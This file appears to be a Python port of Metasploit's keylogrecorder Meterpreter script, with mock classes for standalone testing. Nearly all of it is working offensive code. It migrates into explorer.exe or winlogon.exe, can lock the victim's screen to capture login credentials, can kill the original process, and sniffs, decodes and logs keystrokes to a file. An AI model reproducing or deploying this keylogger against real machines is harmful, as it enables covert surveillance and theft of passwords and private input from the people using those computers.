#!/usr/bin/env python3

#
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
#

# Author: Carlos Perez at carlos_perez[at]darkoperator.com
# Updates by Shellster
# Python translation: Your Name/Handle

import argparse
import os
import struct
import time
from datetime import datetime

# This script assumes a 'client' object is available, representing the Meterpreter session.

# ================== Mock Client for Standalone Testing ==================
class MockUi:
    def __init__(self):
        self._started = False
    def keyscan_start(self):
        self._started = True
        print("[*] Mock UI: Keystroke sniffer started.")
        return True
    def keyscan_dump(self):
        if not self._started:
            return b''
        # Simulate some key presses: "Test<Enter>"
        # Format: (flags << 8) | vk_code
        # n = big-endian 16-bit unsigned
        return struct.pack('>HHHHH',
            (1<<1) | 0x54, # Shift + T
            0x45, # E
            0x53, # S
            0x54, # T
            0x0D  # Enter
        )
    def keyscan_stop(self):
        self._started = False
        print("[*] Mock UI: Keystroke sniffer stopped.")
        return True

class MockRailgun:
    def __init__(self):
        self.user32 = self
    def LockWorkStation(self):
        print("[*] Mock Railgun: user32.LockWorkStation() called.")
        return {'GetLastError': 0}

class MockClient:
    def __init__(self):
        from unittest.mock import Mock
        self.platform = 'windows'
        self.session_host = '127.0.0.1'
        self.sys = Mock()
        self.sys.process.getpid.return_value = 1000
        self.sys.process.get_processes.return_value = [
            {'name': 'explorer.exe', 'pid': 2000},
            {'name': 'winlogon.exe', 'pid': 600}
        ]
        self.core = Mock()
        self.ui = MockUi()
        self.railgun = MockRailgun()
    def is_uac_enabled(self):
        return False

# ================== Virtual Key Codes ==================
# A direct translation of the key code mapping is required here.
# This is a partial list for demonstration.
VIRTUAL_KEY_CODES = {
    0x08: ['Back'], 0x09: ['Tab'], 0x0D: ['Enter'], 0x10: ['Shift'], 0x11: ['Control'],
    0x12: ['Alt'], 0x14: ['Capital'], 0x1B: ['Escape'], 0x20: ['Space'], 0x25: ['Left'],
    0x26: ['Up'], 0x27: ['Right'], 0x28: ['Down'], 0x2E: ['Delete'],
    0x30: ['0', ')'], 0x31: ['1', '!'], 0x32: ['2', '@'], 0x33: ['3', '#'],
    0x34: ['4', '$'], 0x35: ['5', '%'], 0x36: ['6', '^'], 0x37: ['7', '&'],
    0x38: ['8', '*'], 0x39: ['9', '('],
    0x41: ['a', 'A'], 0x42: ['b', 'B'], 0x43: ['c', 'C'], 0x44: ['d', 'D'],
    0x45: ['e', 'E'], 0x46: ['f', 'F'], 0x47: ['g', 'G'], 0x48: ['h', 'H'],
    0x49: ['i', 'I'], 0x4A: ['j', 'J'], 0x4B: ['k', 'K'], 0x4C: ['l', 'L'],
    0x4D: ['m', 'M'], 0x4E: ['n', 'N'], 0x4F: ['o', 'O'], 0x50: ['p', 'P'],
    0x51: ['q', 'Q'], 0x52: ['r', 'R'], 0x53: ['s', 'S'], 0x54: ['t', 'T'],
    0x55: ['u', 'U'], 0x56: ['v', 'V'], 0x57: ['w', 'W'], 0x58: ['x', 'X'],
    0x59: ['y', 'Y'], 0x5A: ['z', 'Z'],
    0xBA: [';', ':'], 0xBB: ['=', '+'], 0xBC: [',', '<'], 0xBD: ['-', '_'],
    0xBE: ['.', '>'], 0xBF: ['/', '?'], 0xC0: ['`', '~'], 0xDB: ['[', '{'],
    0xDC: ['\\', '|'], 0xDD: [']', '}'], 0xDE: ["'", '"']
}

# ================== Helper Functions ==================
def print_status(msg):
    print(f"[*] {msg}")

def print_error(msg):
    print(f"[-] {msg}")

def file_local_write(path, data):
    with open(path, "a", encoding="utf-8") as f:
        f.write(data)

def lock_screen(client):
    print_status("Locking Screen...")
    try:
        lock_info = client.railgun.user32.LockWorkStation()
        if lock_info['GetLastError'] == 0:
            print_status("Screen has been locked")
        else:
            print_error("Screen lock Failed")
    except Exception as e:
        print_error(f"Could not lock screen: {e}")

def migrate_process(client, cap_type, lock, kill):
    process2mig = ""
    if cap_type == 0:
        process2mig = "explorer.exe"
    elif cap_type == 1:
        if client.is_uac_enabled():
            print_error("UAC is enabled on this host! Winlogon migration will be blocked.")
            return False
        process2mig = "winlogon.exe"
        if lock:
            lock_screen(client)

    my_pid = client.sys.process.getpid()
    target_pid = None
    for p in client.sys.process.get_processes():
        if p['name'].lower() == process2mig and p['pid'] != my_pid:
            target_pid = p['pid']
            break

    if not target_pid:
        print_error(f"Could not find process {process2mig} to migrate into.")
        return False

    try:
        print_status(f"\t{process2mig} Process found, migrating into {target_pid}")
        client.core.migrate(target_pid)
        print_status("Migration Successful!!")
        if kill:
            try:
                print_status(f"Killing old process {my_pid}")
                client.sys.process.kill(my_pid)
                print_status("Old process killed.")
            except Exception as e:
                print_error(f"Failed to kill old process: {e}")
        return True
    except Exception as e:
        print_error(f"Failed to migrate: {e}")
        return False

def start_keylogger(client):
    print_status("Starting the keystroke sniffer...")
    try:
        client.ui.keyscan_start()
        return True
    except Exception as e:
        print_error(f"Failed to start keylogging: {e}")
        return False

def write_keylog_data(client, logfile):
    try:
        data = client.ui.keyscan_dump()
        if not data:
            return

        outp = ""
        # Ruby's "n*" is big-endian 16-bit unsigned, so we use ">H" in Python
        # The format string needs to be dynamic based on the length of the data
        num_keys = len(data) // 2
        unpacked_data = struct.unpack(f">{num_keys}H", data)

        for inp in unpacked_data:
            fl = (inp & 0xff00) >> 8
            vk = (inp & 0xff)
            kc = VIRTUAL_KEY_CODES.get(vk)

            f_shift = (fl & (1 << 1)) != 0

            if kc:
                name = kc[1] if f_shift and len(kc) > 1 else kc[0]
                if len(name) == 1:
                    outp += name
                elif name.lower() == 'space':
                    outp += " "
                elif name.lower() in ['shift', 'click']:
                    pass # Ignore
                else:
                    outp += f" <{name}> "
            else:
                outp += f" <0x{vk:02x}> "

        if outp:
            file_local_write(logfile, outp)
    except Exception as e:
        print_error(f"Error dumping keys: {e}")

def key_capture_loop(client, interval, logfile):
    print_status(f"Keystrokes will be saved to {logfile}")
    print_status("Recording... (Press Ctrl-C to stop)")
    try:
        while True:
            write_keylog_data(client, logfile)
            time.sleep(interval)
    except KeyboardInterrupt:
        print_status("\nCtrl-C received.")
    except Exception as e:
        print_error(f"\nAn error occurred: {e}")
    finally:
        print_status("Saving last few keystrokes...")
        write_keylog_data(client, logfile)
        print_status("Stopping keystroke sniffer...")
        client.ui.keyscan_stop()
        print_status("Done.")

# ================== Main Logic ==================
def main():
    parser = argparse.ArgumentParser(description="Keylogger Recorder Meterpreter Script")
    parser.add_argument("-t", "--interval", type=int, default=30, help="Time interval in seconds between recollection of keystrokes, default 30 seconds.")
    parser.add_argument("-c", "--capture-type", type=int, choices=[0, 1, 2], default=2, help="Capture type: (0) for user key presses (migrate to explorer.exe), (1) for winlogon credential capture, (2) for no migration (default).")
    parser.add_argument("-l", "--lock", action="store_true", help="Lock screen when capturing Winlogon credentials (use with -c 1).")
    parser.add_argument("-k", "--kill", action="store_true", help="Kill the original process after migration.")
    args = parser.parse_args()

    if client.platform != 'windows':
        print_error("This script only runs on Windows platforms!")
        return

    host = client.session_host
    timestamp = datetime.now().strftime("%Y%m%d.%M%S")
    log_dir = os.path.join(os.path.expanduser("~"), ".msf4", "logs", "scripts", "keylogrecorder")
    os.makedirs(log_dir, exist_ok=True)
    logfile = os.path.join(log_dir, f"{host}_{timestamp}.txt")

    if args.capture_type == 2: # No migration
        if start_keylogger(client):
            key_capture_loop(client, args.interval, logfile)
    else: # Migration
        if migrate_process(client, args.capture_type, args.lock, args.kill):
            if start_keylogger(client):
                key_capture_loop(client, args.interval, logfile)

if __name__ == "__main__":
    if 'client' not in globals():
        print_status("This script is intended to run in a Meterpreter session.")
        print_status("Initializing a mock client for testing purposes.")
        client = MockClient()
        main()
    else:
        main()